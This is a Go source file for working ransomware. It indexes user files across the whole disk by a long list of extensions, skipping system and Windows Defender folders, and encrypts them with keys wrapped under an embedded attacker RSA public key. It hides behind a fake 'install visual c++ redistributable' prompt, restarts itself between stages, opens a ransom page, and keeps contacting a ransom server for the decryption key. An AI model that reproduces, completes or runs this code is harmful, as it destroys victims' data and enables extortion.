package main

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"html/template"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"time"

	_ "embed"
)

var WHITELISTED_EXTENSIONS = []string{
	"docx", "ppam", "sti", "vcd", "3gp", "sch", "myd", "wb2", "docb", "potx", "sldx", "jpeg",
	"mp4", "dch", "frm", "slk", "docm", "potm", "sldm", "jpg", "mov", "dip", "odb", "dif", "dot",
	"pst", "sldm", "bmp", "avi", "pl", "dbf", "stc", "dotm", "ost", "vdi", "png", "asf", "vb",
	"db", "sxc", "dotx", "msg", "vmdk", "gif", "mpeg", "vbs", "mdb", "ots", "xls", "eml", "vmx",
	"raw", "vob", "ps1", "accdb", "ods", "xlsm", "vsd", "aes", "tif", "wmv", "cmd", "sqlitedb",
	"max", "xlsb", "vsdx", "ARC", "tiff", "fla", "js", "sqlite3", "3ds", "xlw", "txt", "PAQ",
	"nef", "swf", "asm", "asc", "uot", "xlt", "csv", "bz2", "psd", "wav", "h", "lay6", "stw", "xlm",
	"rtf", "tbk", "ai", "mp3", "pas", "lay", "sxw", "xlc", "123", "bak", "svg", "sh", "cpp", "mml",
	"ott", "xltx", "wks", "tar", "djvu", "class", "c", "sxm", "odt", "xltm", "wk1", "tgz", "m4u",
	"jar", "cs", "otg", "pem", "ppt", "pdf", "gz", "m3u", "java", "suo", "odg", "p12", "pptx",
	"dwg", "7z", "mid", "rb", "sln", "uop", "csr", "pptm", "onetoc2", "rar", "wma", "asp", "ldf",
	"std", "crt", "pot", "snt", "zip", "flv", "php", "mdf", "sxd", "key", "pps", "hwp", "backup",
	"3g2", "jsp", "ibd", "otp", "pfx", "ppsm", "602", "iso", "mkv", "brd", "myi", "odp", "der",
	"ppsx", "sxi", "webp", "rs", "go", "ts", "tsx", "md",
}

func hasWhitelistedExtension(filename string) bool {
	for _, extension := range WHITELISTED_EXTENSIONS {
		if strings.HasSuffix(filename, "."+extension) {
			return true
		}
	}

	return false
}

type File struct {
	Path string
	Size int64
}

//go:embed publickey.crt
var AuthorPublicKey []byte

const (
	StateHide int = iota
	StateInitial
	StateIndexing
	StateEncryption
	StatePopup
	StateDecryption
)

type Key struct {
	name string
	key  []byte
}

type State struct {
	Files []File
	Stage int

	Keys        map[string][]byte
	keysChannel chan Key
	quitChannel chan bool

	PrivateKey []byte
	PublicKey  rsa.PublicKey
}

var RansomServer = "http://localhost:8081"

func (s *State) PayRansom() (privateKey *rsa.PrivateKey, err error) {
	v := make(url.Values)
	v.Add("key", string(s.PrivateKey))
	var resp *http.Response
	resp, err = http.PostForm(RansomServer+"/pay-ransom", v)
	if err != nil {
		return
	}

	var bs []byte
	bs, err = io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	privateKey, err = x509.ParsePKCS1PrivateKey(bs)
	return
}

// TODO: improve code quality
func (s *State) EncryptionPhase() {
	wg := new(sync.WaitGroup)

	sort.Slice(s.Files, func(i, j int) bool {
		return s.Files[i].Size < s.Files[j].Size
	})

	for _, file := range s.Files {
		go func(file File, wg *sync.WaitGroup) {
			wg.Add(1)
			key, err := file.EncryptFile(&s.PublicKey)
			if err == nil {
				s.keysChannel <- Key{
					name: file.Path,
					key:  key,
				}
			}
			wg.Done()
		}(file, wg)
	}

	wg.Wait()
	close(s.keysChannel)
	s.quitChannel <- true
	close(s.quitChannel)
}

var BLACKLISTED_DIRECTORIES = []string{
	`C:\Windows`, `C:\Program Files\Windows Defender`, `C:\Program Files\Windows Defender Advanced Threat Protection`, `C:\Program Files\Windows NT`, `C:\Program Files\Internet Explorer`,
	`C:\Program Files (x86)\Windows Defender`, `C:\Program Files (x86)\Windows NT`, `C:\Program Files (x86)\Internet Explorer`,
	`C:\Program Files (Arm)\Windows Defender`, `C:\Program Files (Arm)\Windows NT`, `C:\Program Files (Arm)\Internet Explorer`,

	"/System", "/cores", "/Volumes/disk",
	"/nix",
	"/usr", "/tmp", "/bin", "/dev", "/opt", "/boot", "/sys", "/proc",
}

func is_blacklisted_directory(fullpath string) bool {
	for _, path := range BLACKLISTED_DIRECTORIES {
		if fullpath == path {
			return true
		}
	}

	return false
}

func (s *State) IndexFiles(dir string) (err error) {
	rawDirs, err := os.ReadDir(dir)
	if err != nil {
		return
	}

	for _, v := range rawDirs {
		filename := v.Name()
		fullpath := filepath.Join(dir, filename)

		if v.IsDir() && !is_blacklisted_directory(fullpath) {
			s.IndexFiles(fullpath)
		} else if !v.IsDir() && hasWhitelistedExtension(filename) {
			info, err := v.Info()
			if err != nil {
				continue
			}

			s.Files = append(s.Files, File{
				Path: fullpath,
				Size: info.Size(),
			})
		}
	}

	return
}

//go:embed index.html
var indexHTML string

//go:embed pay.html
var payHTML string

//go:embed decrypted.html
var decryptedHTML []byte

func (s *State) PopupPhase() (err error) {
	// choose random port
	var listener net.Listener
	listener, err = net.Listen("tcp", ":0")
	if err != nil {
		return
	}

	var tempFile *os.File
	os.TempDir()
	tempFile, err = os.CreateTemp("", "*.html")
	if err != nil {
		return
	}

	var indexTemplate *template.Template
	indexTemplate, err = template.New("index").Parse(indexHTML)
	if err != nil {
		return
	}

	if err = indexTemplate.ExecuteTemplate(tempFile, "index", map[string]any{
		"Num": len(s.Files),
		"Url": fmt.Sprintf("http://localhost:%d", listener.Addr().(*net.TCPAddr).Port),
	}); err != nil {
		return
	}

	Open(fmt.Sprintf("file:///%s", tempFile.Name()))

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, payHTML)

		s.Stage = StateDecryption
		if err = s.SaveData(); err != nil {
			log.Fatal(err)
		}
		RestartProgram()
	})

	err = http.Serve(listener, nil)

	return
}

func RestartProgram() {
	procAttr := new(os.ProcAttr)
	procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
	os.StartProcess(os.Args[0], []string{os.Args[0]}, procAttr)
}

func main() {
	var s State
	s.Keys = make(map[string][]byte)
	s, err := LoadData()
	if err != nil {
		s = State{
			Stage: StateHide,
			Keys:  make(map[string][]byte),
		}
	}

	s.keysChannel = make(chan Key)
	s.quitChannel = make(chan bool)

	p, _ := pem.Decode(AuthorPublicKey)

	// The key you will use to encrypt rsa key you generated locally
	publicKey, err := x509.ParsePKIXPublicKey(p.Bytes)
	if err != nil {
		log.Fatal(err)
	}

	switch s.Stage {
	case StateHide:
		fmt.Println("Please install visual c++ 2017 redistributable")
		Open("https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170")

		s.Stage = StateInitial
		if err = s.SaveData(); err != nil {
			log.Fatal(err)
		}

		RestartProgram()
	case StateInitial:
		s.PrivateKey, s.PublicKey, err = generateNewKey(publicKey.(*rsa.PublicKey))
		if err != nil {
			log.Fatal(err)
		}

		s.Stage = StateIndexing
		if err = s.SaveData(); err != nil {
			log.Fatal(err)
		}
		RestartProgram()
	case StateIndexing:
		var top string
		if runtime.GOOS == "windows" {
			top = `C:\`
		} else {
			top = "/"
		}

		if err := s.IndexFiles(top); err != nil {
			log.Fatal(err)
		}

		s.Stage = StateEncryption
		if err = s.SaveData(); err != nil {
			log.Fatal(err)
		}
		RestartProgram()
	case StateEncryption:
		go s.EncryptionPhase()

	meow:
		for {
			select {
			case key, exists := <-s.keysChannel:
				if !exists {
					break meow
				}

				s.Keys[key.name] = key.key
			case <-s.quitChannel:
				break meow
			}
		}

		s.Stage = StatePopup
		if err = s.SaveData(); err != nil {
			log.Fatal(err)
		}
		RestartProgram()
	case StatePopup:
		if err := s.PopupPhase(); err != nil {
			log.Fatal(err)
		}
	case StateDecryption:
		var (
			privateKey *rsa.PrivateKey
			err        error
		)
		privateKey, err = s.PayRansom()

		if err != nil {
			for {
				time.Sleep(time.Second)
				privateKey, err = s.PayRansom()
				if err == nil {
					break
				}
			}
		}

		tempFile, err := os.CreateTemp("", "*.html")
		if err != nil {
			log.Fatal(err)
		}

		if _, err := tempFile.Write(decryptedHTML); err != nil {
			log.Fatal(err)
		}

		for _, file := range s.Files {
			file.DecryptFile(s.Keys[file.Path], privateKey)
		}

		Open(fmt.Sprintf("file:///%s", tempFile.Name()))

		if err = DeleteData(); err != nil {
			log.Fatal(err)
		}
	}
}
